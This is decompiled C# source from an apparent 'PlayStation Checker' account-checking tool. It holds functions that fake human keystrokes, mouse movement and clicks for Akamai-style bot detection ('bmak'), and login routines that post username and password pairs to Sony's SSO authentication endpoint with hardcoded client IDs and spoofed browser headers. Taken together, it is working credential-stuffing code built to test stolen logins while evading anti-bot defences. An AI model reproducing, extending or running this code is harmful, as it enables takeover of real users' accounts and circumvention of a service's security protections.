using System;
using System.Collections.Generic;
using System.Drawing;
using System.Security.Authentication;
using System.Security.Cryptography;
using Leaf.xNet;

namespace PlayStation_Checker_by_Halo
{
	// Token: 0x02000003 RID: 3
	internal static class Actions
	{
		// Token: 0x06000008 RID: 8 RVA: 0x00002D44 File Offset: 0x00000F44
		public static void SendWords(bmak Ibmak, string words, CommonHtmlElement target)
		{
			int num = 0;
			foreach (char c in words)
			{
				if (Actions.IsUpperCase(c))
				{
					if (!Actions.IsUpperCase(words.ToCharArray()[(num != 0) ? (num - 1) : 0]) || num == 0)
					{
						for (int j = 0; j < Actions.rnd.Next(5, 12); j++)
						{
							Ibmak.hkd(new KeyEventArgs(KeyType.Shift, target, 1, '\0', false));
						}
					}
					Ibmak.hkd(new KeyEventArgs(KeyType.Word, target, 1, c, true));
					Ibmak.hkp(new KeyEventArgs(KeyType.Word, target, 3, c, true));
					Ibmak.hku(new KeyEventArgs(KeyType.Word, target, 2, c, true));
					if (!Actions.IsUpperCase(words.ToCharArray()[num]))
					{
						Ibmak.hku(new KeyEventArgs(KeyType.Shift, target, 2, '\0', false));
					}
					else
					{
						for (int k = 0; k < Actions.rnd.Next(2, 6); k++)
						{
							Ibmak.hkd(new KeyEventArgs(KeyType.Shift, target, 1, '\0', false));
						}
					}
				}
				else
				{
					Ibmak.hkd(new KeyEventArgs(KeyType.Word, target, 1, c, false));
					Ibmak.hkp(new KeyEventArgs(KeyType.Word, target, 3, c, false));
					Ibmak.hku(new KeyEventArgs(KeyType.Word, target, 2, c, false));
				}
				num++;
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002E80 File Offset: 0x00001080
		private static bool IsUpperCase(char c)
		{
			return c > '?' && c < 'a';
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002E9C File Offset: 0x0000109C
		public static void MoveMouse(bmak Ibmak, HtmlDocumentPointer documentPointer, int x, int y)
		{
			Point point = (documentPointer.X > x) ? new Point(documentPointer.X, documentPointer.Y) : new Point(x, y);
			Point point2 = (documentPointer.X < x) ? new Point(documentPointer.X, documentPointer.Y) : new Point(x, y);
			double num = (double)((point.Y - point2.Y) / (point.X - point2.X));
			double num2 = (double)point.Y - num * (double)point.X;
			if (point.X != documentPointer.X)
			{
				for (int i = documentPointer.X; i <= x; i++)
				{
					int num3 = i;
					int y2 = Convert.ToInt32(num * (double)num3 + num2);
					Ibmak.hmm(new MouseEnentArgs(num3, y2));
				}
			}
			else
			{
				for (int j = documentPointer.X; j >= x; j--)
				{
					int num4 = j;
					int y3 = Convert.ToInt32(num * (double)num4 + num2);
					Ibmak.hmm(new MouseEnentArgs(num4, y3));
				}
			}
			x = (documentPointer.X = x + 1);
			y = (documentPointer.Y = y + 1);
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002062 File Offset: 0x00000262
		public static void MouseDawn(bmak Ibmak, HtmlDocumentPointer pointer)
		{
			Ibmak.hmd(new MouseEnentArgs(pointer.X, pointer.Y));
		}

		// Token: 0x0600000C RID: 12 RVA: 0x0000207B File Offset: 0x0000027B
		public static void MouseUp(bmak Ibmak, HtmlDocumentPointer pointer)
		{
			Ibmak.hmu(new MouseEnentArgs(pointer.X, pointer.Y));
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002FC8 File Offset: 0x000011C8
		public static void Click(bmak Ibmak, HtmlDocumentPointer pointer)
		{
			Ibmak.hmd(new MouseEnentArgs(pointer.X, pointer.Y));
			Ibmak.hmu(new MouseEnentArgs(pointer.X, pointer.Y));
			Ibmak.hc(new MouseEnentArgs(pointer.X, pointer.Y));
		}

		// Token: 0x0600000E RID: 14 RVA: 0x00002094 File Offset: 0x00000294
		public static void MoveAndClick(bmak Ibmak, HtmlDocumentPointer pointer, int x, int y)
		{
			Actions.MoveMouse(Ibmak, pointer, x, y);
			Actions.Click(Ibmak, pointer);
		}

		// Token: 0x0600000F RID: 15 RVA: 0x000020A6 File Offset: 0x000002A6
		public static void DownMoveAndUp(bmak Ibmak, HtmlDocumentPointer pointer, int x, int y)
		{
			Actions.MouseDawn(Ibmak, pointer);
			Actions.MoveMouse(Ibmak, pointer, x, y);
			Actions.MouseUp(Ibmak, pointer);
		}

		// Token: 0x06000010 RID: 16 RVA: 0x0000301C File Offset: 0x0000121C
		public static HttpResponse DoLogin(bmak Ibmak, string username, string password)
		{
			HttpRequest request = Ibmak.Request;
			request.KeepAlive = true;
			request.AddHeader("Accept-Encoding", "gzip, deflate");
			request.AddHeader(HttpHeader.Origin, "https://id.sonyentertainmentnetwork.com");
			request.AddHeader(HttpHeader.Accept, "*/*");
			request.AddHeader(HttpHeader.Referer, "https://id.sonyentertainmentnetwork.com/");
			request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0";
			string value = "fe1fdbfa-f1a1-47ac-b793-e648fba25e86";
			request.AddHeader("X-Origin-ClientId", value);
			Ibmak.Response = request.Post("https://auth.api.sonyentertainmentnetwork.com/2.0/ssocookie", string.Concat(new string[]
			{
				"{\"authentication_type\":\"password\",\"username\":\"",
				username,
				"\",\"password\":\"",
				password,
				"\",\"client_id\":\"71a7beb8-f21a-47d9-a604-2e71bee24fe0\"}"
			}), "application/json; charset=UTF-8");
			return Ibmak.Response;
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000030D8 File Offset: 0x000012D8
		public static HttpResponse DoLogin(HttpRequest request, string username, string password)
		{
			request.SslProtocols = (SslProtocols.Tls | SslProtocols.Tls11 | SslProtocols.Tls12);
			request.AddHeader("Host", "auth.api.sonyentertainmentnetwork.com");
			request.KeepAlive = true;
			request.AddHeader("Accept-Encoding", "gzip, deflate");
			request.AddHeader(HttpHeader.Origin, "https://id.sonyentertainmentnetwork.com");
			request.AddHeader(HttpHeader.Referer, "https://id.sonyentertainmentnetwork.com/");
			request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0";
			return request.Post("https://auth.api.sonyentertainmentnetwork.com/2.0/ssocookie", string.Concat(new string[]
			{
				"{\"authentication_type\":\"password\",\"username\":\"",
				username,
				"\",\"password\":\"",
				password,
				"\",\"client_id\":\"71a7beb8-f21a-47d9-a604-2e71bee24fe0\"}"
			}), "application/json; charset=UTF-8");
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000020BF File Offset: 0x000002BF
		public static void FocuseDocument(bmak Ibmak)
		{
			Ibmak.hf(true);
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000020C8 File Offset: 0x000002C8
		public static void UnFocuseDocument(bmak Ibmak)
		{
			Ibmak.hb(true);
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000020D1 File Offset: 0x000002D1
		private static IEnumerable<string> CalculateNonce()
		{
			byte[] ByteArray = new byte[52];
			using (RandomNumberGenerator Rnd = RandomNumberGenerator.Create())
			{
				Rnd.GetNonZeroBytes(ByteArray);
			}
			RandomNumberGenerator Rnd = null;
			string s = string.Empty;
			byte[] array = ByteArray;
			foreach (byte b in array)
			{
				int bval = (int)b;
				s += bval.ToString();
			}
			byte[] array2 = null;
			yield return s.Substring(0, 39);
			yield return Convert.ToBase64String(ByteArray).Substring(0, 52);
			yield break;
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000020DA File Offset: 0x000002DA
		public static void SendTab(bmak Ibmak, CommonHtmlElement target)
		{
			Ibmak.hkd(new KeyEventArgs(KeyType.Tab, target, 1, '\0', false));
			Ibmak.hku(new KeyEventArgs(KeyType.Tab, target, 2, '\0', false));
		}

		// Token: 0x06000016 RID: 22 RVA: 0x000020FC File Offset: 0x000002FC
		public static void SendCtrl(bmak Ibmak, CommonHtmlElement target)
		{
			Ibmak.hkd(new KeyEventArgs(KeyType.Ctrl, target, 1, '\0', false));
			Ibmak.hku(new KeyEventArgs(KeyType.Ctrl, target, 2, '\0', false));
		}

		// Token: 0x06000017 RID: 23 RVA: 0x0000211E File Offset: 0x0000031E
		public static void SendAlt(bmak Ibmak, CommonHtmlElement target)
		{
			Ibmak.hkd(new KeyEventArgs(KeyType.Alt, target, 1, '\0', false));
			Ibmak.hku(new KeyEventArgs(KeyType.Alt, target, 2, '\0', false));
		}

		// Token: 0x06000018 RID: 24 RVA: 0x00002140 File Offset: 0x00000340
		public static void SendEnter(bmak Ibmak, CommonHtmlElement target)
		{
			Ibmak.hkd(new KeyEventArgs(KeyType.Enter, target, 1, '\0', false));
			Ibmak.hku(new KeyEventArgs(KeyType.Enter, target, 2, '\0', false));
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00003180 File Offset: 0x00001380
		public static void MoveToSignInID(bmak Ibmak, HtmlDocumentPointer pointer)
		{
			for (int i = 0; i <= Actions.rnd.Next(4); i++)
			{
				Actions.MoveMouse(Ibmak, pointer, GeneratorStaticDependencies.HtmlDocument.MaxWidth, GeneratorStaticDependencies.HtmlDocument.MaxHeight);
			}
			if (Actions.rnd.Next(4) != 0)
			{
				for (int j = 0; j <= Actions.rnd.Next(2); j++)
				{
					Actions.MoveAndClick(Ibmak, pointer, GeneratorStaticDependencies.HtmlDocument.MaxWidth, GeneratorStaticDependencies.HtmlDocument.MaxHeight);
				}
				if (Actions.rnd.Next(2) == 0)
				{
					Actions.MoveAndClick(Ibmak, pointer, Actions.rnd.Next(GeneratorStaticDependencies.PasswordInput.Left, GeneratorStaticDependencies.PasswordInput.Right), Actions.rnd.Next(GeneratorStaticDependencies.PasswordInput.Top, GeneratorStaticDependencies.PasswordInput.Bottom));
				}
				if (Actions.rnd.Next(2) == 0)
				{
					Actions.MoveAndClick(Ibmak, pointer, Actions.rnd.Next(GeneratorStaticDependencies.SubmitButton.Left, GeneratorStaticDependencies.SubmitButton.Right), Actions.rnd.Next(GeneratorStaticDependencies.SubmitButton.Top, GeneratorStaticDependencies.SubmitButton.Bottom));
				}
				if (Actions.rnd.Next(2) == 0)
				{
					Actions.UnFocuseDocument(Ibmak);
					Actions.FocuseDocument(Ibmak);
				}
				Actions.MoveAndClick(Ibmak, pointer, Actions.rnd.Next(GeneratorStaticDependencies.MailInput.Left, GeneratorStaticDependencies.MailInput.Right), Actions.rnd.Next(GeneratorStaticDependencies.MailInput.Top, GeneratorStaticDependencies.MailInput.Bottom));
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00003314 File Offset: 0x00001514
		public static void MoveToSignInPassword(bmak Ibmak, HtmlDocumentPointer pointer)
		{
			for (int i = 0; i <= Actions.rnd.Next(4); i++)
			{
				Actions.MoveMouse(Ibmak, pointer, GeneratorStaticDependencies.HtmlDocument.MaxWidth, GeneratorStaticDependencies.HtmlDocument.MaxHeight);
			}
			if (Actions.rnd.Next(3) != 0)
			{
				for (int j = 0; j <= Actions.rnd.Next(2); j++)
				{
					Actions.MoveAndClick(Ibmak, pointer, GeneratorStaticDependencies.HtmlDocument.MaxWidth, GeneratorStaticDependencies.HtmlDocument.MaxHeight);
				}
				if (Actions.rnd.Next(2) == 0)
				{
					Actions.MoveAndClick(Ibmak, pointer, Actions.rnd.Next(GeneratorStaticDependencies.MailInput.Left, GeneratorStaticDependencies.MailInput.Right), Actions.rnd.Next(GeneratorStaticDependencies.MailInput.Top, GeneratorStaticDependencies.MailInput.Bottom));
				}
				if (Actions.rnd.Next(2) == 0)
				{
					Actions.MoveAndClick(Ibmak, pointer, Actions.rnd.Next(GeneratorStaticDependencies.SubmitButton.Left, GeneratorStaticDependencies.SubmitButton.Right), Actions.rnd.Next(GeneratorStaticDependencies.SubmitButton.Top, GeneratorStaticDependencies.SubmitButton.Bottom));
				}
				if (Actions.rnd.Next(2) == 0)
				{
					Ibmak.hvc();
					Ibmak.hvc();
				}
				Actions.MoveAndClick(Ibmak, pointer, Actions.rnd.Next(GeneratorStaticDependencies.PasswordInput.Left, GeneratorStaticDependencies.PasswordInput.Right), Actions.rnd.Next(GeneratorStaticDependencies.PasswordInput.Top, GeneratorStaticDependencies.PasswordInput.Bottom));
			}
			else
			{
				Actions.SendTab(Ibmak, GeneratorStaticDependencies.MailInput);
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000034B4 File Offset: 0x000016B4
		public static void DoSubmite(bmak Ibmak, HtmlDocumentPointer pointer)
		{
			if (Actions.rnd.Next(2) == 0)
			{
				Actions.MoveAndClick(Ibmak, pointer, Actions.rnd.Next(GeneratorStaticDependencies.SubmitButton.Left, GeneratorStaticDependencies.SubmitButton.Right), Actions.rnd.Next(GeneratorStaticDependencies.SubmitButton.Top, GeneratorStaticDependencies.SubmitButton.Bottom));
			}
			else
			{
				Actions.SendEnter(Ibmak, GeneratorStaticDependencies.PasswordInput);
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00003524 File Offset: 0x00001724
		public static void DoMoreActions(bmak Ibmak, HtmlDocumentPointer pointer)
		{
			Ibmak.hvc();
			Ibmak.hvc();
			for (int i = 0; i <= Actions.rnd.Next(3); i++)
			{
				Actions.MoveAndClick(Ibmak, pointer, GeneratorStaticDependencies.HtmlDocument.MaxWidth, GeneratorStaticDependencies.HtmlDocument.MaxHeight);
			}
			Actions.SendAlt(Ibmak, GeneratorStaticDependencies.MailInput);
			Actions.SendCtrl(Ibmak, GeneratorStaticDependencies.PasswordInput);
			for (int j = 0; j <= Actions.rnd.Next(1, 3); j++)
			{
				Actions.DownMoveAndUp(Ibmak, pointer, GeneratorStaticDependencies.HtmlDocument.MaxWidth, GeneratorStaticDependencies.HtmlDocument.MaxHeight);
			}
		}

		// Token: 0x04000003 RID: 3
		private static Random rnd = new Random();

		// Token: 0x04000004 RID: 4
		private static int logedin = 0;
	}
}
